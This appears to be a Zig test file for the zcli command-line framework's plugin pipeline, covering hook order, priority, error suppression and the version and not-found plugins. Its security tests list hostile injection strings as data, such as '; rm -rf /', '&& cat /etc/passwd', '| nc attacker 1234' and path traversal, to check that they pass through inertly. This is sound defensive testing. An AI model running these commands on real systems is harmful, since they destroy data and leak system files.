//! Behavioral tests for the plugin pipeline — the hook machinery the registry
//! runs around every command. This rebuilds the coverage lost when the
//! pre-monorepo plugin_*_test.zig files were dropped (they targeted the old
//! *zcli.Context / setGlobalData API), rewritten against the current
//! type-safe `context: anytype` plugin model.
//!
//! What the registry does per invocation (see registry.zig `execute`):
//!   1. preParse(ctx, args)            -> rewrite raw argv
//!   2. handleGlobalOption(ctx, n, v)  -> per matched global option
//!   3. transformArgs(ctx, args)       -> rewrite/halt before routing
//!   4. postParse(ctx, parsed)         -> rewrite parsed args
//!   5. preExecute(ctx, parsed)        -> rewrite, or cancel (return null)
//!   6. <command>.execute(...)         -> onError(ctx, err) on failure
//!   7. postExecute(ctx, success)
//! Plugins run highest-`priority` first.

const std = @import("std");
const zcli = @import("zcli");
const testing = std.testing;

// The real plugins under test, imported by source so the behavioral tests below
// exercise the shipped code, not a re-implementation.
const NotFound = @import("plugins/zcli_not_found/plugin.zig");
const Version = @import("plugins/zcli_version/plugin.zig");

// ---------------------------------------------------------------------------
// Test harness
// ---------------------------------------------------------------------------

/// Ordered record of pipeline events for a single run, so tests can assert both
/// "did this hook fire" and "in what order".
const Trace = struct {
    var events: [64][]const u8 = undefined;
    var len: usize = 0;

    fn reset() void {
        len = 0;
    }
    fn record(name: []const u8) void {
        if (len < events.len) {
            events[len] = name;
            len += 1;
        }
    }
    fn items() []const []const u8 {
        return events[0..len];
    }
    fn expectOrder(expected: []const []const u8) !void {
        const got = items();
        try testing.expectEqual(expected.len, got.len);
        for (expected, got) |e, g| try testing.expectEqualStrings(e, g);
    }
};

fn run(comptime App: type, argv: []const []const u8) !void {
    var app = App.init();
    // Empty environment; mirrors registry.zig's own tests (no deinit needed).
    const environ = std.process.Environ.Map.init(testing.allocator);
    // Capture framework output: these tests exercise parse failures and group
    // help, which otherwise spill onto the real stderr of every passing
    // `zig build test` run.
    var out_aw = std.Io.Writer.Allocating.init(testing.allocator);
    defer out_aw.deinit();
    var err_aw = std.Io.Writer.Allocating.init(testing.allocator);
    defer err_aw.deinit();
    var stdio: zcli.Stdio = undefined;
    stdio.init(std.testing.io);
    stdio.stdout_override = &out_aw.writer;
    stdio.stderr_override = &err_aw.writer;
    try app.executeWithStdio(testing.allocator, std.testing.io, &environ, argv, &stdio);
}

/// Like `run`, but returns the captured stdout and stderr (arena-freed by the
/// caller). Also reports whether the invocation errored, so tests can assert
/// both the output and the propagation behavior in one call.
const Captured = struct {
    stdout: []const u8,
    stderr: []const u8,
    err: ?anyerror,

    fn deinit(self: Captured, allocator: std.mem.Allocator) void {
        allocator.free(self.stdout);
        allocator.free(self.stderr);
    }
};

fn runCapture(comptime App: type, argv: []const []const u8) !Captured {
    var app = App.init();
    const environ = std.process.Environ.Map.init(testing.allocator);
    var out_aw = std.Io.Writer.Allocating.init(testing.allocator);
    defer out_aw.deinit();
    var err_aw = std.Io.Writer.Allocating.init(testing.allocator);
    defer err_aw.deinit();
    var stdio: zcli.Stdio = undefined;
    stdio.init(std.testing.io);
    stdio.stdout_override = &out_aw.writer;
    stdio.stderr_override = &err_aw.writer;

    const maybe_err: ?anyerror = blk: {
        app.executeWithStdio(testing.allocator, std.testing.io, &environ, argv, &stdio) catch |e| break :blk e;
        break :blk null;
    };

    return .{
        .stdout = try testing.allocator.dupe(u8, out_aw.written()),
        .stderr = try testing.allocator.dupe(u8, err_aw.written()),
        .err = maybe_err,
    };
}

fn contains(haystack: []const u8, needle: []const u8) bool {
    return std.mem.indexOf(u8, haystack, needle) != null;
}

const test_config = zcli.Config{
    .app_name = "test",
    .app_version = "1.0.0",
    .app_description = "Pipeline test CLI",
};

// ---------------------------------------------------------------------------
// Test commands
// ---------------------------------------------------------------------------

const Greet = struct {
    var executed = false;
    pub const meta = .{ .description = "greet" };
    pub const Args = struct {};
    pub const Options = struct {};
    pub fn execute(_: Args, _: Options, _: anytype) !void {
        executed = true;
    }
};

const Checkout = struct {
    var executed = false;
    pub const meta = .{ .description = "checkout" };
    pub const Args = struct {};
    pub const Options = struct {};
    pub fn execute(_: Args, _: Options, _: anytype) !void {
        executed = true;
    }
};

const Echo = struct {
    var last: []const u8 = "";
    pub const meta = .{ .description = "echo" };
    pub const Args = struct { word: []const u8 };
    pub const Options = struct {};
    pub fn execute(args: Args, _: Options, _: anytype) !void {
        last = args.word;
    }
};

const Fail = struct {
    pub const meta = .{ .description = "fail" };
    pub const Args = struct {};
    pub const Options = struct {};
    pub fn execute(_: Args, _: Options, _: anytype) !void {
        return error.Boom;
    }
};

// ---------------------------------------------------------------------------
// 1. Every hook fires, in the documented order
// ---------------------------------------------------------------------------

const FullHookPlugin = struct {
    pub const global_options = [_]zcli.GlobalOption{
        zcli.option("trace", bool, .{ .default = false, .description = "" }),
    };
    pub fn preParse(_: anytype, args: []const []const u8) ![]const []const u8 {
        Trace.record("preParse");
        return args;
    }
    pub fn handleGlobalOption(_: anytype, name: []const u8, value: anytype) !void {
        _ = name;
        _ = value;
        Trace.record("handleGlobalOption");
    }
    pub fn transformArgs(_: anytype, args: []const []const u8) !zcli.TransformResult {
        Trace.record("transformArgs");
        return .{ .args = args };
    }
    pub fn postParse(_: anytype, parsed: zcli.ParsedArgs) !?zcli.ParsedArgs {
        Trace.record("postParse");
        return parsed;
    }
    pub fn preExecute(_: anytype, parsed: zcli.ParsedArgs) !?zcli.ParsedArgs {
        Trace.record("preExecute");
        return parsed;
    }
    pub fn postExecute(_: anytype, success: bool) !void {
        _ = success;
        Trace.record("postExecute");
    }
    pub fn onError(_: anytype, _: anyerror) !bool {
        Trace.record("onError");
        return false;
    }
};

test "pipeline: all hooks fire in order for a successful command" {
    const App = zcli.Registry.init(test_config)
        .register("greet", Greet)
        .registerPlugin(FullHookPlugin)
        .build();

    Trace.reset();
    Greet.executed = false;
    try run(App, &.{ "--trace", "greet" });

    try testing.expect(Greet.executed);
    // onError must NOT appear — the command succeeded.
    try Trace.expectOrder(&.{
        "preParse",
        "handleGlobalOption",
        "transformArgs",
        "postParse",
        "preExecute",
        "postExecute",
    });
}

// ---------------------------------------------------------------------------
// 2. Multiple plugins run highest-priority first
// ---------------------------------------------------------------------------

fn OrderPlugin(comptime tag: []const u8, comptime prio: i32) type {
    return struct {
        pub const priority = prio;
        pub fn preExecute(_: anytype, parsed: zcli.ParsedArgs) !?zcli.ParsedArgs {
            Trace.record(tag);
            return parsed;
        }
    };
}

test "pipeline: plugins are invoked in descending priority order" {
    const App = zcli.Registry.init(test_config)
        .register("greet", Greet)
        .registerPlugin(OrderPlugin("low", 1))
        .registerPlugin(OrderPlugin("high", 100))
        .build();

    Trace.reset();
    try run(App, &.{"greet"});

    // Registration order is low-then-high, but priority must reorder them.
    try Trace.expectOrder(&.{ "high", "low" });
}

// ---------------------------------------------------------------------------
// 3. preParse rewrites argv before routing
// ---------------------------------------------------------------------------

const AliasPlugin = struct {
    pub fn preParse(_: anytype, args: []const []const u8) ![]const []const u8 {
        // Expand the alias "co" -> "checkout" (static slice; no allocation).
        if (args.len == 1 and std.mem.eql(u8, args[0], "co")) {
            return &.{"checkout"};
        }
        return args;
    }
};

test "pipeline: preParse can rewrite argv and change which command runs" {
    const App = zcli.Registry.init(test_config)
        .register("checkout", Checkout)
        .registerPlugin(AliasPlugin)
        .build();

    Checkout.executed = false;
    try run(App, &.{"co"});
    try testing.expect(Checkout.executed);
}

// ---------------------------------------------------------------------------
// 4. transformArgs can halt the pipeline before the command runs
// ---------------------------------------------------------------------------

const HaltPlugin = struct {
    pub fn transformArgs(_: anytype, args: []const []const u8) !zcli.TransformResult {
        return .{ .args = args, .continue_processing = false };
    }
};

test "pipeline: transformArgs halt prevents command execution" {
    const App = zcli.Registry.init(test_config)
        .register("greet", Greet)
        .registerPlugin(HaltPlugin)
        .build();

    Greet.executed = false;
    try run(App, &.{"greet"}); // no error: halting is a clean stop
    try testing.expect(!Greet.executed);
}

// ---------------------------------------------------------------------------
// 5. preExecute returning null cancels execution
// ---------------------------------------------------------------------------

const CancelPlugin = struct {
    pub fn preExecute(_: anytype, parsed: zcli.ParsedArgs) !?zcli.ParsedArgs {
        _ = parsed;
        return null; // cancel
    }
};

test "pipeline: preExecute returning null cancels the command" {
    const App = zcli.Registry.init(test_config)
        .register("greet", Greet)
        .registerPlugin(CancelPlugin)
        .build();

    Greet.executed = false;
    try run(App, &.{"greet"});
    try testing.expect(!Greet.executed);
}

// ---------------------------------------------------------------------------
// 6. Global options are parsed and dispatched with the right typed value
// ---------------------------------------------------------------------------

const GlobalOptPlugin = struct {
    var verbose_seen: ?bool = null;
    var level_seen: ?[]const u8 = null;

    pub const global_options = [_]zcli.GlobalOption{
        zcli.option("verbose", bool, .{ .short = 'v', .default = false, .description = "" }),
        zcli.option("level", []const u8, .{ .default = "info", .description = "" }),
    };
    pub fn handleGlobalOption(_: anytype, name: []const u8, value: anytype) !void {
        if (std.mem.eql(u8, name, "verbose")) {
            if (@TypeOf(value) == bool) verbose_seen = value;
        } else if (std.mem.eql(u8, name, "level")) {
            if (@TypeOf(value) == []const u8) level_seen = value;
        }
    }
};

test "pipeline: handleGlobalOption receives correctly typed values" {
    const App = zcli.Registry.init(test_config)
        .register("greet", Greet)
        .registerPlugin(GlobalOptPlugin)
        .build();

    GlobalOptPlugin.verbose_seen = null;
    GlobalOptPlugin.level_seen = null;
    try run(App, &.{ "--verbose", "--level", "debug", "greet" });

    try testing.expectEqual(@as(?bool, true), GlobalOptPlugin.verbose_seen);
    try testing.expect(GlobalOptPlugin.level_seen != null);
    try testing.expectEqualStrings("debug", GlobalOptPlugin.level_seen.?);
}

// ---------------------------------------------------------------------------
// 7. postParse can replace the parsed args the command sees
// ---------------------------------------------------------------------------

const InjectPlugin = struct {
    pub fn postParse(_: anytype, parsed: zcli.ParsedArgs) !?zcli.ParsedArgs {
        _ = parsed;
        return .{ .positional = &.{"injected"} };
    }
};

test "pipeline: postParse can rewrite the args the command receives" {
    const App = zcli.Registry.init(test_config)
        .register("echo", Echo)
        .registerPlugin(InjectPlugin)
        .build();

    Echo.last = "";
    try run(App, &.{ "echo", "original" });
    try testing.expectEqualStrings("injected", Echo.last);
}

// ---------------------------------------------------------------------------
// 8. onError on a command failure is symmetric with the CommandNotFound path:
//    returning true suppresses the error; returning false lets it propagate.
// ---------------------------------------------------------------------------

const SuppressErrPlugin = struct {
    var seen: ?anyerror = null;
    var post_success: ?bool = null;
    pub fn onError(_: anytype, err: anyerror) !bool {
        seen = err;
        return true; // handle it -> suppressed
    }
    pub fn postExecute(_: anytype, success: bool) !void {
        post_success = success;
    }
};

test "pipeline: onError returning true suppresses a command-execution error" {
    const App = zcli.Registry.init(test_config)
        .register("fail", Fail)
        .registerPlugin(SuppressErrPlugin)
        .build();

    SuppressErrPlugin.seen = null;
    SuppressErrPlugin.post_success = null;
    // Handled -> the error does NOT propagate (symmetric with CommandNotFound).
    try run(App, &.{"fail"});
    try testing.expectEqual(@as(?anyerror, error.Boom), SuppressErrPlugin.seen);
    // ...and execution falls through to postExecute, told the command failed.
    try testing.expectEqual(@as(?bool, false), SuppressErrPlugin.post_success);
}

const PassThroughErrPlugin = struct {
    var seen: ?anyerror = null;
    pub fn onError(_: anytype, err: anyerror) !bool {
        seen = err;
        return false; // observe only -> error still propagates
    }
};

test "pipeline: onError returning false lets a command error propagate" {
    const App = zcli.Registry.init(test_config)
        .register("fail", Fail)
        .registerPlugin(PassThroughErrPlugin)
        .build();

    PassThroughErrPlugin.seen = null;
    try testing.expectError(error.Boom, run(App, &.{"fail"}));
    try testing.expectEqual(@as(?anyerror, error.Boom), PassThroughErrPlugin.seen);
}

// ---------------------------------------------------------------------------
// 9. onError CAN suppress CommandNotFound (the help-plugin path)
// ---------------------------------------------------------------------------

const NotFoundPlugin = struct {
    var handled = false;
    pub fn onError(_: anytype, err: anyerror) !bool {
        if (err == error.CommandNotFound) {
            handled = true;
            return true;
        }
        return false;
    }
};

const ThrowingOnError = struct {
    pub const priority = 200; // runs before any handler
    pub fn onError(_: anytype, _: anyerror) !bool {
        return error.HookBoom;
    }
};

test "pipeline: a failing onError hook does not swallow the original error (#390)" {
    const App = zcli.Registry.init(test_config)
        .register("fail", Fail)
        .registerPlugin(ThrowingOnError)
        .build();

    const cap = try runCapture(App, &.{"fail"});
    defer cap.deinit(testing.allocator);

    // The command's own error propagates — not the hook's.
    try testing.expectEqual(@as(?anyerror, error.Boom), cap.err);
    // The hook's failure is surfaced, not silently dropped.
    try testing.expect(contains(cap.stderr, "onError hook failed with HookBoom"));
}

test "pipeline: a failing onError hook falls through to the next handler (#390)" {
    const App = zcli.Registry.init(test_config)
        .register("fail", Fail)
        .registerPlugin(ThrowingOnError)
        .registerPlugin(SuppressErrPlugin)
        .build();

    SuppressErrPlugin.seen = null;
    const cap = try runCapture(App, &.{"fail"});
    defer cap.deinit(testing.allocator);

    // The lower-priority handler still sees and suppresses the original error.
    try testing.expectEqual(@as(?anyerror, null), cap.err);
    try testing.expectEqual(@as(?anyerror, error.Boom), SuppressErrPlugin.seen);
}

test "pipeline: onError returning true suppresses CommandNotFound" {
    const App = zcli.Registry.init(test_config)
        .register("greet", Greet)
        .registerPlugin(NotFoundPlugin)
        .build();

    NotFoundPlugin.handled = false;
    try run(App, &.{"does-not-exist"}); // unknown command -> handled, no error
    try testing.expect(NotFoundPlugin.handled);
}

// ---------------------------------------------------------------------------
// 10. postExecute is told whether the command succeeded
// ---------------------------------------------------------------------------

const PostExecPlugin = struct {
    var success_seen: ?bool = null;
    pub fn postExecute(_: anytype, success: bool) !void {
        success_seen = success;
    }
};

test "pipeline: postExecute receives success=true after a successful command" {
    const App = zcli.Registry.init(test_config)
        .register("greet", Greet)
        .registerPlugin(PostExecPlugin)
        .build();

    PostExecPlugin.success_seen = null;
    try run(App, &.{"greet"});
    try testing.expectEqual(@as(?bool, true), PostExecPlugin.success_seen);
}

// ---------------------------------------------------------------------------
// 11. Plugin-provided commands run the IDENTICAL pipeline as regular commands
//
// The registry routes them differently (registered tree vs Plugin.commands),
// but everything after routing must be the same shared sequence. These are
// the parity tests for that shared execution path.
// ---------------------------------------------------------------------------

const PluginCmdProvider = struct {
    pub const commands = struct {
        pub const pgreet = struct {
            var executed = false;
            pub const meta = .{ .description = "plugin greet" };
            pub const Args = struct {};
            pub const Options = struct {};
            pub fn execute(_: Args, _: Options, _: anytype) !void {
                executed = true;
            }
        };
        pub const pfail = struct {
            pub const meta = .{ .description = "plugin fail" };
            pub const Args = struct {};
            pub const Options = struct {};
            pub fn execute(_: Args, _: Options, _: anytype) !void {
                return error.Boom;
            }
        };
        // Nested namespace: "remote" registers as a metadata-only plugin
        // command group, "remote add" as a leaf under it.
        pub const remote = struct {
            pub const meta = .{ .description = "nested group" };
            pub const add = struct {
                var last: []const u8 = "";
                pub const meta = .{ .description = "nested plugin command" };
                pub const Args = struct { name: []const u8 };
                pub const Options = struct {};
                pub fn execute(args: Args, _: Options, _: anytype) !void {
                    last = args.name;
                }
            };
        };
    };
};

test "pipeline parity: a plugin command runs the identical hook sequence as a regular command" {
    const App = zcli.Registry.init(test_config)
        .register("greet", Greet)
        .registerPlugin(FullHookPlugin)
        .registerPlugin(PluginCmdProvider)
        .build();

    const expected: []const []const u8 = &.{ "preParse", "transformArgs", "postParse", "preExecute", "postExecute" };

    Trace.reset();
    Greet.executed = false;
    try run(App, &.{"greet"});
    try testing.expect(Greet.executed);
    try Trace.expectOrder(expected);

    Trace.reset();
    PluginCmdProvider.commands.pgreet.executed = false;
    try run(App, &.{"pgreet"});
    try testing.expect(PluginCmdProvider.commands.pgreet.executed);
    try Trace.expectOrder(expected);
}

test "pipeline parity: a failing plugin command gets onError suppression and postExecute(success=false)" {
    const App = zcli.Registry.init(test_config)
        .registerPlugin(SuppressErrPlugin)
        .registerPlugin(PluginCmdProvider)
        .build();

    SuppressErrPlugin.seen = null;
    SuppressErrPlugin.post_success = null;
    try run(App, &.{"pfail"}); // handled -> no propagation, same as a regular command
    try testing.expectEqual(@as(?anyerror, error.Boom), SuppressErrPlugin.seen);
    try testing.expectEqual(@as(?bool, false), SuppressErrPlugin.post_success);
}

test "pipeline parity: nested plugin commands route longest-match first" {
    const App = zcli.Registry.init(test_config)
        .registerPlugin(PluginCmdProvider)
        .build();

    PluginCmdProvider.commands.remote.add.last = "";
    try run(App, &.{ "remote", "add", "origin" });
    try testing.expectEqualStrings("origin", PluginCmdProvider.commands.remote.add.last);
}

// ---------------------------------------------------------------------------
// 12. Metadata-only groups (regular AND plugin) run hooks, then route through
//     CommandNotFound — the same trace shape from both origins.
// ---------------------------------------------------------------------------

const MetaGroup = struct {
    pub const meta = .{ .description = "group without execute" };
};

/// Low-priority error sink so handled-error flows stay silent and error-free
/// while a recorder plugin observes the sequence.
const HandleAllPlugin = struct {
    pub const priority = 1;
    pub fn onError(_: anytype, _: anyerror) !bool {
        return true;
    }
};

test "pipeline parity: metadata-only groups run hooks then onError, from either origin" {
    const App = zcli.Registry.init(test_config)
        .register("mgroup", MetaGroup)
        .registerPlugin(FullHookPlugin)
        .registerPlugin(HandleAllPlugin)
        .registerPlugin(PluginCmdProvider)
        .build();

    // Hooks run first; then the group routes through onError (handled here),
    // and postExecute must NOT fire — nothing executed.
    const expected: []const []const u8 = &.{ "preParse", "transformArgs", "postParse", "preExecute", "onError" };

    Trace.reset();
    try run(App, &.{"mgroup"}); // regular registered group
    try Trace.expectOrder(expected);

    Trace.reset();
    try run(App, &.{"remote"}); // plugin command group (nested namespace)
    try Trace.expectOrder(expected);
}

// ---------------------------------------------------------------------------
// 13. A parse error runs onError (with the pipeline intact behind it) and
//     skips postExecute.
// ---------------------------------------------------------------------------

test "pipeline: parse errors reach onError and skip postExecute" {
    const App = zcli.Registry.init(test_config)
        .register("echo", Echo)
        .registerPlugin(FullHookPlugin)
        .registerPlugin(HandleAllPlugin)
        .build();

    Trace.reset();
    try run(App, &.{"echo"}); // missing required positional; handled -> no error
    try Trace.expectOrder(&.{ "preParse", "transformArgs", "postParse", "preExecute", "onError" });
}

// ---------------------------------------------------------------------------
// 14. onError dispatch is first-handler-wins in priority order
// ---------------------------------------------------------------------------

fn ErrOrderPlugin(comptime tag: []const u8, comptime prio: i32, comptime handles: bool) type {
    return struct {
        pub const priority = prio;
        pub fn onError(_: anytype, _: anyerror) !bool {
            Trace.record(tag);
            return handles;
        }
    };
}

test "pipeline: the first handling plugin stops onError dispatch" {
    const App = zcli.Registry.init(test_config)
        .register("fail", Fail)
        .registerPlugin(ErrOrderPlugin("err-low", 1, true))
        .registerPlugin(ErrOrderPlugin("err-high", 100, true))
        .build();

    Trace.reset();
    try run(App, &.{"fail"});
    // High handles it; low is never consulted.
    try Trace.expectOrder(&.{"err-high"});
}

test "pipeline: a non-handling plugin passes onError down the priority chain" {
    const App = zcli.Registry.init(test_config)
        .register("fail", Fail)
        .registerPlugin(ErrOrderPlugin("obs-high", 100, false))
        .registerPlugin(ErrOrderPlugin("sink-low", 1, true))
        .build();

    Trace.reset();
    try run(App, &.{"fail"});
    try Trace.expectOrder(&.{ "obs-high", "sink-low" });
}

// ---------------------------------------------------------------------------
// 15. ContextData: default-initialized, shared across hooks and the command,
//     and handed to deinitContextData at the end of the run
// ---------------------------------------------------------------------------

const StatefulPlugin = struct {
    pub const plugin_id = "stateful";
    pub const ContextData = struct { count: u32 = 0 };

    var final_count: ?u32 = null;

    pub fn deinitContextData(data: *ContextData, allocator: std.mem.Allocator) void {
        _ = allocator;
        final_count = data.count;
    }

    pub fn preExecute(context: anytype, parsed: zcli.ParsedArgs) !?zcli.ParsedArgs {
        context.plugins.stateful.count += 1;
        return parsed;
    }
};

const ReadState = struct {
    var seen: ?u32 = null;
    pub const meta = .{ .description = "read plugin state" };
    pub const Args = struct {};
    pub const Options = struct {};
    pub fn execute(_: Args, _: Options, context: anytype) !void {
        seen = context.plugins.stateful.count;
        context.plugins.stateful.count += 10;
    }
};

test "pipeline: ContextData flows default -> hook mutation -> command -> deinit" {
    const App = zcli.Registry.init(test_config)
        .register("state", ReadState)
        .registerPlugin(StatefulPlugin)
        .build();

    StatefulPlugin.final_count = null;
    ReadState.seen = null;
    try run(App, &.{"state"});

    // Default 0, +1 in preExecute, observed by the command...
    try testing.expectEqual(@as(?u32, 1), ReadState.seen);
    // ...whose own mutation is what deinitContextData receives at teardown.
    try testing.expectEqual(@as(?u32, 11), StatefulPlugin.final_count);
}

// ---------------------------------------------------------------------------
// Pipeline robustness against adversarial input
//
// security_test.zig and property_test.zig feed malicious input to the parsers in
// isolation. These push it through the *whole* `app.execute` pipeline — global
// option scanning, value consumption, routing — which has its own arg handling
// the parser-only tests never exercise. The contract: adversarial input is
// treated as inert data (never interpreted, never crashes the pipeline).
// ---------------------------------------------------------------------------

const adversarial_inputs = [_][]const u8{
    "$(whoami)",
    "`id`",
    "; rm -rf /",
    "&& cat /etc/passwd",
    "| nc attacker 1234",
    "%s%s%s%n", // format-string attack
    "../../../../etc/passwd",
    "\x00hidden", // embedded null byte
    "A" ** 4096, // oversized
};

test "pipeline security: adversarial command names route safely, never to a real command" {
    const App = zcli.Registry.init(test_config)
        .register("greet", Greet)
        .registerPlugin(NotFoundPlugin) // swallow CommandNotFound
        .build();

    for (adversarial_inputs) |bad| {
        Greet.executed = false;
        // Must not panic. An error is acceptable; a crash or misroute is not.
        run(App, &.{bad}) catch {};
        try testing.expect(!Greet.executed);
    }
}

test "pipeline security: global option values pass through verbatim (no interpretation)" {
    const App = zcli.Registry.init(test_config)
        .register("greet", Greet)
        .registerPlugin(GlobalOptPlugin)
        .build();

    for (adversarial_inputs) |bad| {
        GlobalOptPlugin.level_seen = null;
        // `--level <bad>`: the value is consumed and handed to the plugin as-is.
        try run(App, &.{ "--level", bad, "greet" });
        try testing.expect(GlobalOptPlugin.level_seen != null);
        try testing.expectEqualStrings(bad, GlobalOptPlugin.level_seen.?);
    }
}

test "pipeline security: command arguments reach the command verbatim" {
    const App = zcli.Registry.init(test_config)
        .register("echo", Echo)
        .build();

    for (adversarial_inputs) |bad| {
        Echo.last = "";
        // A parse error is fine (no crash); when it parses, it must be literal.
        run(App, &.{ "echo", bad }) catch continue;
        try testing.expectEqualStrings(bad, Echo.last);
    }
}

test "pipeline security: an oversized argument vector does not crash the pipeline" {
    const App = zcli.Registry.init(test_config)
        .register("echo", Echo)
        .build();

    var args = std.ArrayList([]const u8).empty;
    defer args.deinit(testing.allocator);
    try args.append(testing.allocator, "echo");
    for (0..5000) |_| try args.append(testing.allocator, "x");

    // Echo wants a single positional, so this errors — but it must not panic,
    // leak, or corrupt state while scanning thousands of args.
    run(App, args.items) catch {};
}

// ===========================================================================
// zcli_version behavioral tests (the real plugin, in a real registry)
// ===========================================================================

test "version: --version prints '<name> v<version>' and skips the command" {
    const App = zcli.Registry.init(test_config)
        .register("greet", Greet)
        .registerPlugin(Version)
        .build();

    Greet.executed = false;
    const cap = try runCapture(App, &.{ "--version", "greet" });
    defer cap.deinit(testing.allocator);

    try testing.expect(cap.err == null);
    try testing.expect(!Greet.executed); // preExecute cancels before the command runs
    try testing.expectEqualStrings("test v1.0.0\n", cap.stdout);
}

test "version: -V short flag works too" {
    const App = zcli.Registry.init(test_config)
        .register("greet", Greet)
        .registerPlugin(Version)
        .build();

    Greet.executed = false;
    const cap = try runCapture(App, &.{"-V"});
    defer cap.deinit(testing.allocator);

    try testing.expect(cap.err == null);
    try testing.expect(contains(cap.stdout, "test v1.0.0"));
}

test "version: --version with a valid command still shows the version" {
    const App = zcli.Registry.init(test_config)
        .register("greet", Greet)
        .registerPlugin(Version)
        .build();

    Greet.executed = false;
    const cap = try runCapture(App, &.{ "greet", "--version" });
    defer cap.deinit(testing.allocator);

    try testing.expect(cap.err == null);
    try testing.expect(!Greet.executed);
    try testing.expect(contains(cap.stdout, "test v1.0.0"));
}

test "version: --version on a bogus command shows the version via onError (regression: was 'command not found')" {
    const App = zcli.Registry.init(test_config)
        .register("greet", Greet)
        .registerPlugin(Version)
        .build();

    const cap = try runCapture(App, &.{ "--version", "does-not-exist" });
    defer cap.deinit(testing.allocator);

    // onError caught CommandNotFound, printed the version, and suppressed the
    // error — the user gets what they asked for, not a not-found message.
    try testing.expect(cap.err == null);
    try testing.expect(contains(cap.stdout, "test v1.0.0"));
    try testing.expect(!contains(cap.stderr, "Unknown command"));
}

test "version: declares priority 90 so a higher-priority plugin's preExecute wins" {
    // The priority mechanism orders EVERY dispatched hook highest-first (see the
    // "descending priority order" test above). Version sits at 90 so that when
    // help (priority 100, added on help's own branch) also fires for
    // `--help --version`, help's preExecute cancels first and the version line
    // never prints. We can't register the real Help here (its priority isn't 100
    // on this branch), so assert the value directly and prove the ordering with
    // a stand-in higher-priority cancel plugin.
    try testing.expectEqual(@as(i32, 90), Version.priority);

    const App = zcli.Registry.init(test_config)
        .register("greet", Greet)
        .registerPlugin(Version)
        .registerPlugin(OrderPlugin("cancel", 100)) // a 100-priority preExecute
        .build();

    // OrderPlugin records but returns the args unchanged, so version still runs;
    // the point is the *order*: the 100-priority hook is consulted before
    // version's 90-priority preExecute.
    Trace.reset();
    const cap = try runCapture(App, &.{ "--version", "greet" });
    defer cap.deinit(testing.allocator);
    try testing.expect(cap.err == null);
    // The 100-priority plugin ran (its preExecute fired before version's).
    try testing.expect(Trace.len >= 1);
    try testing.expectEqualStrings("cancel", Trace.events[0]);
}

// ===========================================================================
// zcli_not_found behavioral tests (the real plugin, WITHOUT help so the plugin
// must be self-contained across all three CommandNotFound origins)
// ===========================================================================

const Init = struct {
    pub const meta = .{ .description = "init" };
    pub const Args = struct {};
    pub const Options = struct {};
    pub fn execute(_: Args, _: Options, _: anytype) !void {}
};

const Run = struct {
    pub const meta = .{ .description = "run" };
    pub const Args = struct {};
    pub const Options = struct {};
    pub fn execute(_: Args, _: Options, _: anytype) !void {}
};

/// A metadata-only group with two subcommands, for the bare-group origin.
const RemoteProvider = struct {
    pub const commands = struct {
        pub const remote = struct {
            pub const meta = .{ .description = "manage remotes" };
            pub const add = struct {
                pub const meta = .{ .description = "add a remote" };
                pub const Args = struct { name: []const u8 };
                pub const Options = struct {};
                pub fn execute(_: Args, _: Options, _: anytype) !void {}
            };
            pub const remove = struct {
                pub const meta = .{ .description = "remove a remote" };
                pub const Args = struct { name: []const u8 };
                pub const Options = struct {};
                pub fn execute(_: Args, _: Options, _: anytype) !void {}
            };
        };
    };
};

test "not_found: an unknown command reports it and suggests the closest match" {
    const App = zcli.Registry.init(test_config)
        .register("search", Greet)
        .register("status", Checkout)
        .registerPlugin(NotFound)
        .build();

    // "serach" is one transposition from "search".
    const cap = try runCapture(App, &.{"serach"});
    defer cap.deinit(testing.allocator);

    // The error propagates (not_found returns false on the genuine-unknown path).
    try testing.expectEqual(@as(?anyerror, error.CommandNotFound), cap.err);
    try testing.expect(contains(cap.stderr, "Unknown command 'serach'"));
    try testing.expect(contains(cap.stderr, "Did you mean 'search'?"));
}

test "not_found: multiple close matches list several suggestions" {
    const App = zcli.Registry.init(test_config)
        .register("start", Greet)
        .register("status", Checkout)
        .registerPlugin(NotFound)
        .build();

    // "stat" is within distance 3 of both "start" and "status" (and < input.len).
    const cap = try runCapture(App, &.{"stat"});
    defer cap.deinit(testing.allocator);

    try testing.expectEqual(@as(?anyerror, error.CommandNotFound), cap.err);
    try testing.expect(contains(cap.stderr, "Did you mean one of these?"));
    try testing.expect(contains(cap.stderr, "start"));
    try testing.expect(contains(cap.stderr, "status"));
}

test "not_found: a short input offers no suggestions (guard against noise)" {
    const App = zcli.Registry.init(test_config)
        .register("init", Init)
        .register("run", Run)
        .registerPlugin(NotFound)
        .build();

    // "i" is distance 3 from both "init" and "run"; the length guard rejects
    // both, so there is no "Did you mean" line at all.
    const cap = try runCapture(App, &.{"i"});
    defer cap.deinit(testing.allocator);

    try testing.expectEqual(@as(?anyerror, error.CommandNotFound), cap.err);
    try testing.expect(contains(cap.stderr, "Unknown command 'i'"));
    try testing.expect(!contains(cap.stderr, "Did you mean"));
}

test "not_found: nothing close offers no suggestions but still lists commands" {
    const App = zcli.Registry.init(test_config)
        .register("search", Greet)
        .registerPlugin(NotFound)
        .build();

    const cap = try runCapture(App, &.{"zzzzzzzz"});
    defer cap.deinit(testing.allocator);

    try testing.expectEqual(@as(?anyerror, error.CommandNotFound), cap.err);
    try testing.expect(contains(cap.stderr, "Unknown command 'zzzzzzzz'"));
    try testing.expect(!contains(cap.stderr, "Did you mean"));
    try testing.expect(contains(cap.stderr, "Available commands:"));
    try testing.expect(contains(cap.stderr, "search"));
}

test "not_found (self-contained): a bare command group lists its subcommands, no double output" {
    const App = zcli.Registry.init(test_config)
        .registerPlugin(NotFound)
        .registerPlugin(RemoteProvider)
        .build();

    // "remote" is a real group — not a typo. Accessing it bare must show its
    // subcommands and suppress the registry's own "'remote' is a command group"
    // line (the not_found plugin returns true), so it appears exactly once.
    const cap = try runCapture(App, &.{"remote"});
    defer cap.deinit(testing.allocator);

    try testing.expect(cap.err == null); // handled -> suppressed
    try testing.expect(contains(cap.stderr, "'remote' is a command group"));
    try testing.expect(contains(cap.stderr, "add"));
    try testing.expect(contains(cap.stderr, "remove"));
    // Not a typo, so no suggestions and no "Unknown command" framing.
    try testing.expect(!contains(cap.stderr, "Unknown command"));
    try testing.expect(!contains(cap.stderr, "Did you mean"));
    // The registry's own group line ("Use --help to see available subcommands")
    // must not appear on top of ours.
    try testing.expect(!contains(cap.stderr, "Use --help to see available subcommands"));
}

test "not_found (self-contained): no command at all lists commands, no bare fallback" {
    const App = zcli.Registry.init(test_config)
        .register("search", Greet)
        .register("status", Checkout)
        .registerPlugin(NotFound)
        .build();

    // Empty argv -> no command, no root. not_found renders the command list and
    // suppresses the registry's bare "No command specified. Use --help..." line.
